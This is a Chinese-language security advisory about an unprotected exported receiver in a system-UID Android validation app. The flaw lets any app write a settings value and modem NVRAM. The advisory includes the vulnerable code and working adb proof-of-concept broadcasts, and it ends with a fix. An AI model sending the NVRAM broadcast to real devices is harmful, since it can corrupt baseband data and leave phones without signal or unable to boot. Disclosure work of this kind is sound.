# V07 — `QmmiBroadcastReceiver2` 任意写 Settings.System / 基带 NVRAM

| 项 | 值 |
|----|----|
| **严重性** | 🔴 严重 |
| **CWE** | CWE-306 / CWE-862 Missing Authorization |
| **受影响应用** | `com.sprd.validationtools` |
| **UID** | **1000** |
| **组件** | `com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2` |
| **exported** | `true` |
| **permission** | **无** |
| **实机验证** | ✅ 已确认（Settings 写入）|

---

## 1. 摘要

该 BroadcastReceiver 导出且无权限保护，接受两个 action，分别造成：

1. **写 `Settings.System.MMI_BARCODE`** —— 已实机验证
2. **写 modem NVRAM** —— 代码路径确认，未实际执行（不可完全回滚）

## 2. 漏洞代码

```java
@Override
public void onReceive(Context context, Intent intent) {
    String action = intent.getAction();

    // 路径 1: 写 Settings.System
    if (action != null && action.equals(
            "com.qualcomm.qti.qmmicustom.QMMI_ACTION_START_FLAGS2")) {
        this.barcode = intent.getStringExtra("barcode");     // ← 外部可控
        this.station = intent.getStringExtra("station");     // ← 外部可控
        this.mIgnore = intent.getBooleanExtra("ignore", false);
        intentTarget(this.station, this.barcode, this.mIgnore);
    }

    // 路径 2: 写 NVRAM
    if (action == null || !action.equals(
            "com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2")) return;

    this.barcode = intent.getStringExtra("barcode");
    intentTargetDEVICEINFO(this.barcode);
}

public void intentTargetDEVICEINFO(String str) {
    Settings.System.putString(this.mContext.getContentResolver(),
                              "MMI_BARCODE", str);              // ← 写入!
    ...
}

private void witeBarCodeToModem2() {
    this.cmdOrder = Pattern.compile("[^a-zA-Z0-9]")
                          .matcher(this.cmdOrder).replaceAll(" ");  // 弱过滤
    byte[] bytes2 = ...;
    NvramAgentHelper.wirteDataToNvramBuff(bytes2, true);           // ← 写 NVRAM
}
```

## 3. 影响

### 3.1 Settings.System 写入

`MMI_BARCODE` 通常用于存放产线扫码得到的设备条码。伪造后：

- 设备信息/保修查询可能返回错误结果
- 若其他组件信任该值，可能引发二级问题

> 注：写 Settings 本身需要 `WRITE_SETTINGS`，但此处在 **system UID** 进程内
> 执行，因此调用方普通应用也能间接获得写入效果 —— 这是典型的**权限借用**。

### 3.2 NVRAM 写入

modem NVRAM 是基带持久化存储。写入异常数据可能导致：

- 无法注册网络 / 无信号
- IMEI 相关区域被破坏（若 barcode 映射到该区）
- 严重时无法开机（需专用工具修复）

过滤只有 `[^a-zA-Z0-9] → 空格`，仍可写入任意字母数字串。

## 4. 复现

### 4.1 Settings（安全，可回滚）

```bash
# 写入
adb shell am broadcast \
  -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 \
  -n com.sprd.validationtools/com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2 \
  --es barcode "POC_TEST"

# 验证
adb shell settings get system MMI_BARCODE
# 输出: POC_TEST

# 回滚
adb shell am broadcast \
  -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 \
  -n com.sprd.validationtools/com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2 \
  --es barcode ""
```

### 4.2 NVRAM（⚠️ 高风险，仅限测试机）

```bash
adb shell am broadcast \
  -a com.qualcomm.qti.qmmicustom.QMMI_ACTION_START_FLAGS2 \
  -n com.sprd.validationtools/com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2 \
  --es barcode "TEST123" --es station "AUDIO"
```

> 该操作无通用回滚方法。执行前请确认已备份 NVRAM 或拥有产线修复工具。

## 5. 修复建议

```xml
<receiver android:name="...QmmiBroadcastReceiver2"
          android:exported="false"
          android:permission="com.sprd.validationtools.permission.QMMI">
```

并在 `onReceive` 中校验 `Binder.getCallingUid()` 是否为已知产线工具。
